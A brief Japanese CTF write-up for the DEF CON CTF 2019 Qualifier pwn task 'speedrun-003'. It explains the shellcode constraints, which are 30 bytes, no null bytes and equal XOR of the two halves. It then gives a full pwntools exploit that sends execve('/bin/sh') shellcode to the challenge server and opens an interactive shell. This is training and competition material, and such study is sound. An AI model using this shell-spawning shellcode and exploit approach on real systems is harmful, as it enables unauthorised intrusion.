# [pwn 5pts] speedrun-003 - DEF CON CTF 2019 Qualifier
64ビットで全部有効です。
```
$ checksec -f speedrun-003
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   77 Symbols     Yes	0		4	speedrun-003
```
シェルコードを受け付けてくれるのですが、次の条件があります。

- null文字は含まない
- 30バイト
- 前半15バイトのXORと後半15バイトのXORが一致する

条件を満たすように最後のバイトを適当に探索して終わりです。
```python
from pwn import *

def xor(shellcode):
    r = 0
    for c in shellcode:
        r ^= ord(c)
    return r

elfpath = "speedrun-003"
sock = remote("speedrun-003.quals2019.oooverflow.io", 31337)
#sock = process(elfpath)

shellcode = asm("""
mov rbx, 0xFF978CD091969DD1
neg rbx
push rbx
push rsp
pop rdi
cdq
push rdx
push rdi
push rsp
pop rsi
mov al, 0x3b
syscall
""", arch="amd64")
shellcode += b'A' * (0x1d - len(shellcode))

print(disasm(shellcode, arch='amd64'))

for c in range(0x100):
    if xor(shellcode[:15]) == xor(shellcode[15:] + chr(c)):
        shellcode += chr(c)
        break
else:
    print("ops")

sock.send(shellcode)

sock.interactive()
```

# 感想
初心者向けの問題です。
